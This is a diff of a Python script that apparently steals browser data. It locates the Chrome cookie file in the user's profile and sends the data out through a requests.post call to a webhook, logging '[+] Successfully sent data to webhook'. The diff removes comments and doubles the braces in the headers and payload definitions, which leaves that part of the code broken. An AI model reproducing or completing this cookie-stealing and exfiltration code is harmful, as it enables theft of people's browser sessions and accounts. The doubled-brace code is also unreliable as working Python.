@@ -4,7 +4,6 @@ from datetime import datetime
 
 def get_browser_data():
     # Code to extract browser data and cookies goes here
-    # For example, to get Chrome cookies:
     chrome_cookie_file = os.path.join(
         os.environ['USERPROFILE'],
         'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
@@ -33,8 +32,6 @@ import os
 import requests
 
 def get_browser_data():
-    # Code to extract browser data and cookies goes here
-    # For example, to get Chrome cookies:
     chrome_cookie_file = os.path.join(
         os.environ['USERPROFILE'],
         'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
@@ -48,8 +45,8 @@ def get_browser_data():
         return None
 
 def send_data_to_webhook(webhook_url, data):
-    headers = {'Content-Type': 'application/json'}
-    payload = {'content': f'{data.decode()}'}
+    headers = {{'Content-Type': 'application/json'}}
+    payload = {{'content': f'{{data.decode()}}'}}
     response = requests.post(webhook_url, headers=headers, json=payload)
     if response.status_code == 200:
         print('[+] Successfully sent data to webhook')
